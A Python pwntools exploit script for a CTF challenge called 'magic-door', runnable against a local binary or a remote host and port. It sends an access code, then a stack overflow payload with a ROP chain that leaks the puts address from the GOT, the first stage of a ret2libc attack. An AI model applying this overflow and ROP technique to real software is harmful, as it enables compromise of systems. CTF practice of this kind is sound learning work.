from pwn import *
import os

context.arch = 'amd64'
pty = process.PTY
is_local = False
is_remote = False

elf = ELF("/home/kali/CTF/WargamesMy/Pwn/magic-door/challenge/magic_door")
if len(sys.argv) == 1:
    is_local = True
    p = process(elf.path, stdin=pty, stdout=pty)

elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)


debug(cmd='''
b *magic_door+135
''')
print(p.recvuntilS("open?"))
p.sendline("0000050015")
print(p.recvuntilS("go?"))

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
ret = (rop.find_gadget(['ret']))[0]  # stack alignment
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

log.info("pop rdi: " + hex(pop_rdi))
log.info("Puts@plt: " + hex(puts_plt))
log.info("Puts got: " + hex(puts_got))

payload = b'A' * 72 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)


p.sendline(payload)
#print(p.recvall(timeout=1))
print(p.recvall(1))




p.interactive()
